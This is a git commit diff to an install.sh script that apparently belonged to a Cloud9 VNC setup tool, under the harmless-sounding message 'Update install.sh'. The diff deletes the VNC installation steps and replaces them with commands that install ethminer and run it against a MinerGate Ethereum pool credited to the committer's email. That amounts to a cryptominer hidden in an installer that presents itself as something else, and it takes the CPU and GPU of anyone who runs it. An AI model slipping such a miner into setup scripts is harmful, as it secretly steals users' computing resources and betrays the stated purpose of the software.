f4cea6569c6c84042ab41bc6f66f0dd15b77f66b
dimlevsha <dimlevsha@gmail.com>
2017-08-14 21:11:26 +1000

    Update install.sh

--- install.sh
+++ install.sh
@@ -7,46 +7,10 @@ if [[ $UID != 0 ]]; then
     exit 1
 fi
 
-#Get prerequisites
+ apt-get update
+ apt-get install software-properties-common
+ add-apt-repository ppa:ethereum/ethereum
+ apt-get update
+ apt-get install ethminer
+ ethminer -C -F http://eth.pool.minergate.com:55751/dimlevsha@gmail.com --disable-submit-hashrate
 
-#force update
-
-sudo apt-get update 
-sudo apt-get install supervisor xvfb fluxbox x11vnc websockify
-
-#Copy supervisord configuration to proper configuration directory
-cp supervisord.conf /etc/supervisor/supervisord.conf 
-
-#Create the proper directory for the script
-sudo mkdir /opt/c9vnc
-
-#Make sure that the runners folder exists
-mkdir ${HOME}/workspace/.c9/runners
-
-#Copy the C9 runner to the C9 watch folder
-cp c9vnc.run ${HOME}/workspace/.c9/runners/c9vnc.run
-
-#Copy the run script to proper /opt/ directory
-sudo cp run.sh /opt/c9vnc/c9vnc.sh
-
-#Copy the run script to proper /opt/ directory
-sudo cp uninstall.sh /opt/c9vnc/uninstall.sh
-
-#Support password for x11vnc
-sudo cp x11vncrun.sh /opt/c9vnc/x11vncrun.sh
-
-#Clone noVNC into proper /opt/ directory
-git clone git://github.com/kanaka/noVNC /opt/noVNC/
-
-#Set up password for x11vnc
-echo
-echo
-while true; do
-    read -p "Do you wish to set password for x11vnc? (not recommended for public workspaces!) " yn
-    case $yn in
-#        [Yy]* ) x11vnc -storepasswd; break;; Coming later
-        [Yy]* ) (echo Coming later); break;;
-        [Nn]* ) exit;;
-        * ) echo "Please answer yes or no.";;
-    esac
-done
